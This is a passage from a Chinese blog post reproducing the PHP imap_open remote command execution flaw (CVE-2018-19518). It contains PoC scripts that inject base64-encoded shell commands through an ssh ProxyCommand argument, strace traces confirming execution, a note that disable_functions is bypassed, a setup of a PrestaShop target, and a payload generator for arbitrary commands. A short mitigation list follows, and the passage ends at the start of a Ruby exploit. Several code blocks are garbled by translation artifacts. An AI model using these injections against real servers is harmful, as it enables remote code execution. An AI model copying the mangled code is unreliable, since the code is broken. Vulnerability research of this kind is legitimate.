class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/* Process rc file</span><br><span class="line"> * Accepts: file name</span><br><span class="line"> *          .mminit flag</span><br><span class="line"> * Don&apos;t use this feature.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">void dorc (char *file,long flag)</span><br><span class="line">&#123;</span><br><span class="line">  int i;</span><br><span class="line">  char *s,*t,*k,*r,tmp[MAILTMPLEN],tmpx[MAILTMPLEN];</span><br><span class="line">  extern MAILSTREAM CREATEPROTO;</span><br><span class="line">  extern MAILSTREAM EMPTYPROTO;</span><br><span class="line">  DRIVER *d;</span><br><span class="line">  FILE *f;</span><br><span class="line">  if ((f = fopen (file ? file : SYSCONFIG,&quot;r&quot;)) &amp;&amp;</span><br><span class="line">      (s = fgets (tmp,MAILTMPLEN,f)) &amp;&amp; (t = strchr (s,&apos;\n&apos;))) do &#123;</span><br><span class="line">    *t++ = &apos;\0&apos;;                /* tie off line, find second space */</span><br><span class="line">    if ((k = strchr (s,&apos; &apos;)) &amp;&amp; (k = strchr (++k,&apos; &apos;))) &#123;</span><br><span class="line">      *k++ = &apos;\0&apos;;              /* tie off two words */</span><br><span class="line">      if (!compare_cstring (s,&quot;set keywords&quot;) &amp;&amp; !userFlags[0]) &#123;</span><br><span class="line">                                /* yes, get first keyword */</span><br><span class="line">        k = strtok_r (k,&quot;, &quot;,&amp;r);</span><br><span class="line">        </span><br><span class="line">          fs_give ((void **) &amp;sharedHome);</span><br><span class="line">          sharedHome = cpystr (k);</span><br><span class="line">        &#125;</span><br><span class="line">        else if (!compare_cstring (s,&quot;set system-inbox&quot;)) &#123;</span><br><span class="line">          fs_give ((void **) &amp;sysInbox);</span><br><span class="line">          sysInbox = cpystr (k);</span><br><span class="line">        &#125;</span><br><span class="line">        else if (!compare_cstring (s,&quot;set mail-subdirectory&quot;)) &#123;</span><br><span class="line">          fs_give ((void **) &amp;mailsubdir);</span><br><span class="line">          mailsubdir = cpystr (k);</span><br><span class="line">        &#125;</span><br><span class="line">        else if (!compare_cstring (s,&quot;set from-widget&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_FROMWIDGET,</span><br><span class="line">                           compare_cstring (k,&quot;header-only&quot;) ?</span><br><span class="line">                           VOIDT : NIL);</span><br><span class="line">^L</span><br><span class="line">        else if (!compare_cstring (s,&quot;set rsh-command&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_RSHCOMMAND,(void *) k);</span><br><span class="line">        else if (!compare_cstring (s,&quot;set rsh-path&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_RSHPATH,(void *) k);</span><br><span class="line">        else if (!compare_cstring (s,&quot;set ssh-command&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_SSHCOMMAND,(void *) k);</span><br><span class="line">        else if (!compare_cstring (s,&quot;set ssh-path&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_SSHPATH,(void *) k);</span><br><span class="line">        else if (!compare_cstring (s,&quot;set tcp-open-timeout&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_OPENTIMEOUT,(void *) atol (k));</span><br><span class="line">        else if (!compare_cstring (s,&quot;set tcp-read-timeout&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_READTIMEOUT,(void *) atol (k));</span><br><span class="line">        else if (!compare_cstring (s,&quot;set tcp-write-timeout&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_WRITETIMEOUT,(void *) atol (k));</span><br><span class="line">        else if (!compare_cstring (s,&quot;set rsh-timeout&quot;))</span><br><span class="line">          mail_parameters (NIL,SET_RSHTIMEOUT,(void *) atol (k));</span><br></pre></td></tr></table></figure></p><p>默认情况下它是空的，我们是无法控制它的，因为/etc目录没有写入权限。</p><p>呐，我们跳转到RSHPATH。他在Makefile中。<br>不同版本的发行版为其Makefile的路径都会不同。<br>如果你不知道你的Makefile的路径，你可以在/usr/bin/rsh查看Makefile的路径。<br>/imap-2007f/src/osdep/unix/Makefile:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bs3: # BSD/i386 3.0 or higher</span><br><span class="line">…</span><br><span class="line">RSHPATH=/usr/bin/rsh \</span><br><span class="line">…</span><br><span class="line">bsf: # FreeBSD</span><br><span class="line">…</span><br><span class="line">RSHPATH=/usr/bin/rsh \</span><br><span class="line">…</span><br><span class="line">mnt: # Mint</span><br><span class="line">…</span><br><span class="line">RSHPATH=/usr/bin/rsh \</span><br><span class="line">…</span><br><span class="line">osx: # Mac OS X</span><br><span class="line">…</span><br><span class="line">RSHPATH=/usr/bin/rsh \</span><br><span class="line">…</span><br><span class="line">slx: # Secure Linux</span><br><span class="line">…</span><br><span class="line">RSHPATH=/usr/bin/rsh \</span><br></pre></td></tr></table></figure></p><p>我们cat一下tcp_appen返回都改变了什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#endif</span><br><span class="line">  if (*service == &apos;*&apos;) &#123;        /* want ssh? */</span><br><span class="line">                                /* return immediately if ssh disabled */</span><br><span class="line">    if (!(sshpath &amp;&amp; (ti = sshtimeout))) return NIL;</span><br><span class="line">                                /* ssh command prototype defined yet? */</span><br><span class="line">    if (!sshcommand) sshcommand = cpystr (&quot;%s %s -l %s exec /usr/sbin/r%sd&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">                                /* want rsh? */</span><br><span class="line">  else if (rshpath &amp;&amp; (ti = rshtimeout)) &#123;</span><br><span class="line">                                /* rsh command prototype defined yet? */</span><br><span class="line">    if (!rshcommand) rshcommand = cpystr (&quot;%s %s -l %s exec /usr/sbin/r%sd&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else return NIL;              /* rsh disabled */</span><br><span class="line">                                /* look like domain literal? */</span><br></pre></td></tr></table></figure><p>我们发现上述的代码示例生成一个命令，用于在远程服务器上执行rimapd二进制文件。<br>让我们创建一个PHP脚本进行测试test1.php。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># CRLF (c)</span><br><span class="line"># echo &apos;1234567890&apos;&gt;/tmp/test0001</span><br><span class="line">$server = &quot;x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh&#125;&quot;;</span><br><span class="line">imap_open(&apos;&#123;&apos;.$server.&apos;:143/imap&#125;INBOX&apos;, &apos;&apos;, &apos;&apos;) or die(&quot;\n\nError: &quot;.imap_last_error());</span><br></pre></td></tr></table></figure></p><p>Poc地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php</span><br></pre></td></tr></table></figure></p><p>使用带有execve系统调用过滤的strace工具来观察脚本处理期间将执行的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -e trace=clone, execve php test1.php</span><br></pre></td></tr></table></figure></p><p>如回显，这里的x其实是执行命令的参数之一，这意味着我们可以在操作服务器地址参数时操纵命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[pid 17251] execve(&quot;/usr/bin/rsh&quot;, [&quot;/usr/bin/rsh&quot;, &quot;x&quot;, &quot;-oProxyCommand=echo\tZWNobyAnMTIz&quot;..., &quot;-l&quot;, &quot;root&quot;, &quot;exec&quot;, &quot;/usr/sbin/rimapd&quot;], [/* 20 vars */] &lt;unfinished ...&gt;</span><br><span class="line"></span><br><span class="line">我们ssh的一个ProxyCommand，连接服务器的这样的一个命令具体说明如下</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ProxyCommand</span><br><span class="line">指定用于连接服务器的命令。命令字符串扩展到行的末尾，并使用用户的shell&apos; exec&apos;指令执行，以避免延迟的shell进程。</span><br><span class="line">ProxyCommand接受TOKENS 部分中描述的令牌的 参数。该命令基本上可以是任何东西，并且应该从其标准输入读取并写入其标准输出。它应该最终连接在某台机器上运行的sshd（8）服务器，或者在sshd -i某处执行。主机密钥管理将使用所连接主机的HostName完成（默认为用户键入的名称）。设置命令以none完全禁用此选项。请注意， CheckHostIP无法与代理命令连接。</span><br><span class="line">该指令与nc（1）及其代理支持结合使用非常有用 。例如，以下指令将通过192.0.2.0的HTTP代理连接：</span><br><span class="line">ProxyCommand / usr / bin / nc -X connect -x 192.0.2.0:8080% h％p</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oProxyCommand =“echo hello | tee / tmp / executed”localhost</span><br></pre></td></tr></table></figure><p>命令成功执行，回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hacker:/tmp# ssh -oProxyCommand=&quot;echo hello|tee /tmp/executed&quot; localhost</span><br><span class="line">ssh_exchange_identification: Connection closed by remote host</span><br><span class="line">root@hacker:/tmp# cat /tmp/executed</span><br><span class="line">hello</span><br><span class="line">root@hacker:/tmp#</span><br></pre></td></tr></table></figure></p><p>这时我们不能直接将它转移到PHP脚本来代替imap_open服务器地址，因为在解析时，它将空格解释为分隔符和斜杠作为标志。但，你可以使用$ IFS shell变量来替换空格符号或普通选项卡（\ t）。还可以在bash中使用Ctrl + V热键和Tab键插入标签。<br>要想绕过斜杠，你可以使用base64编码和相关命令对其进行解码，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;echo hello|tee /tmp/executed&quot;|base64</span><br><span class="line">ehco ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|base64 -d|bash</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hacker:/tmp# echo ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|base64 -d|bash</span><br><span class="line">hello</span><br><span class="line">root@hacker:/tmp#</span><br></pre></td></tr></table></figure><p>我们也可以也hack bar里对其用base64进行解码<br>开个题外话，刚还在群里问了大佬们用的firefox的hackbar多一点还是chrome的hackbar多一点呢，因为我感觉firefox的hackbar更舒服，但是更喜欢用chrome，很纠结，还是看习惯吧</p><p> 呐，我们现在放到PHP进行测试<br> 新建一个test2.php<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = “echo hello|tee /tmp/executed”;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = “any -o ProxyCommand=echo\t”.$encoded_payload.”|base64\t-d|bash”;</span><br><span class="line">@imap_open(‘&#123;‘.$server.’&#125;:143/imap&#125;INBOX’, ‘’, ‘’);</span><br></pre></td></tr></table></figure></p><p>现在再次使用strace执行它并观察命令行调用的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@hacker:/tmp# strace -f -e trace=clone,execve php test2.php</span><br><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test2.php&quot;], [/* 20 vars */]) = 0</span><br><span class="line">strace: Process 17488 attached</span><br><span class="line">strace: Process 17489 attached</span><br><span class="line">[pid 17489] execve(&quot;/usr/bin/rsh&quot;, [&quot;/usr/bin/rsh&quot;, &quot;any&quot;, &quot;-o&quot;, &quot;ProxyCommand=echo\tZWNobyBoZWxsb3&quot;..., &quot;-l&quot;, &quot;root&quot;, &quot;exec&quot;, &quot;/usr/sbin/rimapd&quot;], [/* 20 vars */] &lt;unfinished ...&gt;</span><br><span class="line">[pid 17488] +++ exited with 1 +++</span><br><span class="line">[pid 17487] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17488, si_uid=0, si_status=1, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[pid 17489] &lt;... execve resumed&gt; )      = 0</span><br><span class="line">[pid 17489] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f84a6842650) = 17490</span><br><span class="line">strace: Process 17490 attached</span><br><span class="line">[pid 17490] execve(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;exec echo\tZWNobyBoZWxsb3x0ZWUgL3&quot;...], [/* 20 vars */]) = 0</span><br><span class="line">[pid 17490] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f302b766e10) = 17491</span><br><span class="line">[pid 17490] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f302b766e10) = 17492</span><br><span class="line">[pid 17490] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f302b766e10) = 17493</span><br><span class="line">strace: Process 17493 attached</span><br><span class="line">strace: Process 17492 attached</span><br><span class="line">[pid 17493] execve(&quot;/bin/bash&quot;, [&quot;bash&quot;], [/* 20 vars */]) = 0</span><br><span class="line">[pid 17492] execve(&quot;/usr/bin/base64&quot;, [&quot;base64&quot;, &quot;-d&quot;], [/* 20 vars */]strace: Process 17491 attached</span><br><span class="line">) = 0</span><br><span class="line">[pid 17491] execve(&quot;/bin/echo&quot;, [&quot;echo&quot;, &quot;ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVj&quot;...], [/* 20 vars */]) = 0</span><br><span class="line">[pid 17492] +++ exited with 0 +++</span><br><span class="line">[pid 17491] +++ exited with 0 +++</span><br><span class="line">[pid 17493] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f292e137e10) = 17494</span><br><span class="line">[pid 17493] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f292e137e10) = 17495</span><br><span class="line">strace: Process 17495 attached</span><br><span class="line">[pid 17495] execve(&quot;/usr/bin/tee&quot;, [&quot;tee&quot;, &quot;/tmp/executed&quot;], [/* 20 vars */]) = 0</span><br><span class="line">strace: Process 17494 attached</span><br><span class="line">[pid 17494] +++ exited with 0 +++</span><br><span class="line">[pid 17495] +++ exited with 0 +++</span><br><span class="line">[pid 17493] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17494, si_uid=0, si_status=0, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[pid 17493] +++ exited with 0 +++</span><br><span class="line">[pid 17490] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17492, si_uid=0, si_status=0, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[pid 17490] +++ exited with 0 +++</span><br><span class="line">[pid 17489] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17490, si_uid=0, si_status=0, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[pid 17489] +++ exited with 255 +++</span><br><span class="line">PHP Notice:  Unknown: No such host as any -o ProxyCommand=echoZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZA==|base64-d|bash (errflg=2) in Unknown on line 0</span><br><span class="line">+++ exited with 0 +++</span><br><span class="line">root@hacker:/tmp#</span><br></pre></td></tr></table></figure></p><p>被我们用红色框圈出来的，它们都正在远程服务器上运行。利用完成，文件创建成功。这些命令不是由PHP本身执行，而是由外部库执行，这意味着什么？？意味着他们都不会阻止它执行，而不是事件disable_functions指令。</p><h3 id="现在我们放在简单的生产环境进行测试"><a href="#现在我们放在简单的生产环境进行测试" class="headerlink" title="现在我们放在简单的生产环境进行测试"></a>现在我们放在简单的生产环境进行测试</h3><p>PrestaShop,PrestaShop是一种免费增值的开源电子商务解决方案,它是由php编写的，mysql数据库，<br>官网给出的最低配置，我们简略的看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install -y wget unzip apache2 mysql-server php-zip php-curl php-mysql php-gd php-mbstring</span><br><span class="line">service mysql start</span><br><span class="line">mysql -u root -e &quot;CREATE DATABASE prestashop; GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;megapass&apos;;&quot;</span><br><span class="line">a2enmod rewrite</span><br></pre></td></tr></table></figure></p><p>我们cd 到/var/www/html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.prestashop.com/download/releases/prestashop_1.7.4.4.zip</span><br><span class="line">unzip prestashop_1.7.4.4.zip</span><br><span class="line">#Start Apache2 daemon and surf your web-server to begin shop installation.</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure></p><p>访问192.168.169.128/install/index.php进行安装，并登陆管理面板<br>我们也可以查看AdminCustomerThreads的源代码/prestashop-1.7.4.4/controllers/admin/AdminCustomerThreadsController.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// Executes the IMAP synchronization.</span><br><span class="line">$sync_errors = $this-&gt;syncImap();</span><br><span class="line">…</span><br><span class="line">public function syncImap()</span><br><span class="line">&#123;</span><br><span class="line">if (!($url = Configuration::get(‘PS_SAV_IMAP_URL’))</span><br><span class="line">|| !($port = Configuration::get(‘PS_SAV_IMAP_PORT’))</span><br><span class="line">|| !($user = Configuration::get(‘PS_SAV_IMAP_USER’))</span><br><span class="line">|| !($password = Configuration::get(‘PS_SAV_IMAP_PWD’))) &#123;</span><br><span class="line">return array(‘hasError’ =&gt; true, ‘errors’ =&gt; array(‘IMAP configuration is not correct’));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conf = Configuration::getMultiple(array(</span><br><span class="line">‘PS_SAV_IMAP_OPT_POP3’, ‘PS_SAV_IMAP_OPT_NORSH’, ‘PS_SAV_IMAP_OPT_SSL’,</span><br><span class="line">‘PS_SAV_IMAP_OPT_VALIDATE-CERT’, ‘PS_SAV_IMAP_OPT_NOVALIDATE-CERT’,</span><br><span class="line">‘PS_SAV_IMAP_OPT_TLS’, ‘PS_SAV_IMAP_OPT_NOTLS’));</span><br><span class="line">…</span><br><span class="line">$mbox = @imap_open(‘&#123;‘.$url.’:’.$port.$conf_str.’&#125;’, $user, $password);</span><br></pre></td></tr></table></figure></p><p>在这里你可以看到imap_open调用的url变量<br>现在我们执行paylaod.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php </span><br><span class="line">$ payload = $ argv [1]; </span><br><span class="line">$ encoded_pa​​yload = base64_encode（$ payload）; </span><br><span class="line">$ server =“any -o ProxyCommand = echo \ t”。$ encoded_pa​​yload。“| base64 \ td | bash&#125;”; </span><br><span class="line">print（“payload：&#123;$ server&#125;”。PHP_EOL）;</span><br></pre></td></tr></table></figure></p><p>草，终于能看见远程执行了，好了复现就到这里</p><h1 id="管理员可以做点什么？"><a href="#管理员可以做点什么？" class="headerlink" title="管理员可以做点什么？"></a>管理员可以做点什么？</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">建议管理员应用适当的更新。</span><br><span class="line"></span><br><span class="line">建议管理员仅允许受信任的用户进行网络访问。</span><br><span class="line"></span><br><span class="line">建议管理员同时运行防火墙和防病毒应用程序，以最大限度地降低入站和出站威胁的可能性。</span><br><span class="line"></span><br><span class="line">管理员可以考虑使用基于IP的访问控制列表（ACL），仅允许受信任的系统访问受影响的系统。</span><br><span class="line"></span><br><span class="line">管理员可以使用可靠的防火墙策略帮助保护受影响的系统免受外部攻击。</span><br><span class="line"></span><br><span class="line">建议管理员监视受影响的系统。</span><br></pre></td></tr></table></figure><p>大佬的帖子是这么写的，稍微搬一下，没怎么做翻译，说一下自己结合的理解，类似于PrestaShop这样的软件暂时没有更新版本解决这个安全问题。<br>听说，PHP大佬已经发布了针对此问题的补丁，估计Linux发行版中的存储库和软件包也未必有这么快动作来更新安全补丁</p><h1 id="最后奉上CVE-2018-19518漏洞利用的-rb"><a href="#最后奉上CVE-2018-19518漏洞利用的-rb" class="headerlink" title="最后奉上CVE-2018-19518漏洞利用的.rb"></a>最后奉上CVE-2018-19518漏洞利用的.rb</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span 